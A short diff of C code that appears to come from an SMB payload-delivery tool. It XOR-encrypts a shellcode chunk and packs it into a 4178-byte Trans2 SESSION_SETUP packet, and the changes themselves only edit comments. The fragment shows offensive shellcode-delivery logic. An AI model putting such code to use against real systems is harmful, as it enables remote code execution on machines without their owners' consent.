@@ -275,7 +275,7 @@ int main(int argc, char* argv[])
 	unsigned int ChunkSize = 4096 ^ XorKey;
 	unsigned int OffsetofChunkinPayload = XorKey ^ XorKey;
 
-	//allocate memory for encrypted shellcode payload
+	//allocate memory for encrypted shellcode payload buffer
 	unsigned char *encrypted;
 	encrypted = (unsigned char*)malloc(4096+1);
 
@@ -293,8 +293,8 @@ int main(int argc, char* argv[])
 
 	//build packet buffer with 4178 bytes in length
 	//82 bytes for the Trans2 Session Setup packet header
+	//12 bytes for the SESSION_SETUP
 	//then 4096 bytes for the SESSION_SETUP data ( encrypted payload )
-	//Then fill the packet with 0x00s and XOR it with the calculated key
 	unsigned char *big_packet = (unsigned char*)malloc(4178+1);
 	memset(big_packet, 0x00, 4178);
 
